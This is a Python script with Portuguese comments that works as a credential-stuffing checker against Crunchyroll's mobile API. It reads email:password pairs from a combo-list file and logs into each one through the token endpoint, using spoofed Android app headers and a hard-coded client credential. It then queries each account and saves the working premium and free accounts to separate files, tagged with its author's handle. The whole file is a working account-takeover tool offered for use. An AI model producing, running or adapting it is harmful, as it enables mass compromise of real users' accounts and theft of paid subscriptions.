import requests
import time



def Testar(email, senha):
    start_time = time.time()

    # 1 LOGIN
    headers = {
        'Host': 'beta-api.crunchyroll.com',
        'newrelic': 'eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IjEzNTQwMDkiLCJkLmFwIjoiNjk0OTM3NjQyIiwiZC50ciI6ImUyM2RlNWI5M2NiNzRiYjVhYTAzY2RiN2M4M2U3NWE3IiwiZC5pZCI6IjFjNzAyNGRmYjBlNDQ3MzkiLCJkLnRpIjoxNjI0OTIxMTQxOTkwfX0=',
        'traceparent': '00-e23de5b93cb74bb5aa03cdb7c83e75a7-72782d5b62054c1e-00',
        'tracestate': '@nr=0-2-1354009-694937642-72782d5b62054c1e--00--1624921141990',
        'authorization': 'Basic eGFmZWQ3N19nYnM5anY4YW9uNWk6YktzX3BQeERzQW1lamQ2djhBRDRJTGRQeFM2cnFUelM=',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Crunchyroll/3.9.1 Android/8.1.0 okhttp/4.9.1',
        'x-newrelic-id': 'VQUCVVZTARAGXVVbBAYBUlY='
    }

    data = {
        'username': email,
        'password': senha,
        'grant_type': 'password',
        'scope': 'offline_access'
    }

    response = requests.post('https://beta-api.crunchyroll.com/auth/v1/token', headers=headers, data=data)
    data1 = response.json()

    if 'access_token' in data1:
        access_token = data1['access_token']
        # Verificar se a conta é premium
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': 'Crunchyroll/3.9.1 Android/8.1.0 okhttp/4.9.1'
        }
        response = requests.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers)
        account_details = response.json()

        if 'error' in account_details:
            return f'DIE ➜ {email}|{senha} ➜ email/senha incorretas @zekry'
        else:
            is_premium = account_details.get('subscription', {}).get('type') == 'premium'
            if is_premium:
                return f'LIVE ➜ {email}|{senha} ➜ Conta Premium @zekry'
            else:
                return f'LIVE ➜ {email}|{senha} ➜ Conta Gratuita @zekry'
    else:
        return f'DIE ➜ {email}|{senha} ➜ email/senha incorretas @zekry'

lista = open("db30.txt", "r", encoding="utf8")


separador = ":"
e = [s.strip() for s in lista.readlines()]

premium_accounts = []  # Lista para armazenar contas premium
free_accounts = []  # Lista para armazenar contas gratuitas

for i in e:
    explode = i.split(separador)
    result = Testar(explode[0].strip(), explode[1].strip())
    print(result)

    if "Conta Premium" in result:
        premium_accounts.append(result)
    else:
        free_accounts.append(result)

# Salvar contas premium em um arquivo txt
if premium_accounts:
    with open("contas_premium.txt", "w") as file:
        for account in premium_accounts:
            file.write(account + "\n")

# Salvar contas gratuitas em um arquivo txt
if free_accounts:
    with open("contas_gratuitas.txt", "w") as file:
        for account in free_accounts:
            file.write(account + "\n")

